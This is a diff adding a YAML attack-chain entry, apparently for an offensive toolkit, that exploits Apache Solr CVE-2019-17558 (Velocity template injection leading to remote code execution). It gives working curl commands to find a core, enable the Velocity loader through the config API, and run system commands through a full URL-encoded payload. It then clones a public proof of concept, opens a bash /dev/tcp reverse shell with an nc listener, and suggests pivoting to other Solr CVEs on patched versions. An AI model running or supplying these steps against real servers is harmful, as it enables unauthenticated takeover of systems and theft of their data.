@@ -1,0 +1,68 @@
+chain_id: solr_cve_2019_17558_velocity_ssti
+title: "Apache Solr — CVE-2019-17558 Velocity ResponseWriter SSTI → RCE"
+severity: CRITICAL
+tags: [solr, apache, cve-2019-17558, ssti, velocity, rce, unauth]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2019-17558" }
+    - { product_pattern: "(?i)solr" }
+    - { banner_pattern: "(?i)apache solr|solrcloud" }
+    - { port_in: [8983], path_pattern: "(?i)/solr/" }
+
+description: |
+  Apache Solr 5.0.0 → 8.3.1 ships a Velocity-based response writer
+  whose template loader can be flipped to "string" at runtime via
+  the config API. After the flip, `wt=velocity` plus a `v.template`
+  query param renders attacker-controlled Velocity — and Velocity
+  exposes Java reflection. Two HTTP requests, no auth, no special
+  config required beyond the default `_default` core. Mass-scanned
+  to this day; CVSS 9.8.
+
+steps:
+  - id: 1
+    title: "Find a core to target"
+    command: |
+      curl -s "http://$VICTIMA:8983/solr/admin/cores?wt=json" | jq -r '.status | keys[]'
+      # Pick any core name; the rest of the chain uses $CORE.
+
+  - id: 2
+    title: "Flip params.resource.loader.enabled to true"
+    command: |
+      curl -s "http://$VICTIMA:8983/solr/$CORE/config" \
+        -H 'Content-Type: application/json' \
+        -d '{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}'
+
+  - id: 3
+    title: "Render `id` via inline Velocity template"
+    command: |
+      curl -s "http://$VICTIMA:8983/solr/$CORE/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%22%22)%20%23set(%24rt%3D%24x.class.forName(%22java.lang.Runtime%22))%20%23set(%24chr%3D%24x.class.forName(%22java.lang.Character%22))%20%23set(%24str%3D%24x.class.forName(%22java.lang.String%22))%20%23set(%24ex%3D%24rt.getRuntime().exec(%22id%22))%20%24ex.waitFor()%20%23set(%24out%3D%24ex.getInputStream())%20%23foreach(%24i%20in%20%5B1..%24out.available()%5D)%24str.valueOf(%24chr.toChars(%24out.read()))%23end"
+
+  - id: 4
+    title: "Public PoC for clean output"
+    command: |
+      git clone https://github.com/jas502n/solr_rce /tmp/solr_rce
+      python3 /tmp/solr_rce/cve-2019-17558.py http://$VICTIMA:8983/solr/$CORE 'id; uname -a'
+
+  - id: 5
+    title: "Reverse shell"
+    command: |
+      python3 /tmp/solr_rce/cve-2019-17558.py http://$VICTIMA:8983/solr/$CORE \
+        "bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'"
+      nc -lvnp 4444
+
+common_errors:
+  - error: "config update returns 'no such handler'"
+    solution: |
+      Solr cluster mode (SolrCloud) hides /config behind ZooKeeper.
+      Use the same payload via `/solr/admin/configs?action=UPLOAD`
+      with a Velocity-enabled solrconfig.xml in the ZIP.
+  - error: "Solr 8.4+"
+    solution: |
+      Velocity loader is hard-disabled. Pivot to CVE-2019-0193
+      (DataImportHandler RCE) if `/solr/$CORE/dataimport` is
+      reachable, or CVE-2023-50386 (RuntimeLib backdoor).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2019-17558
+  - https://issues.apache.org/jira/browse/SOLR-13971
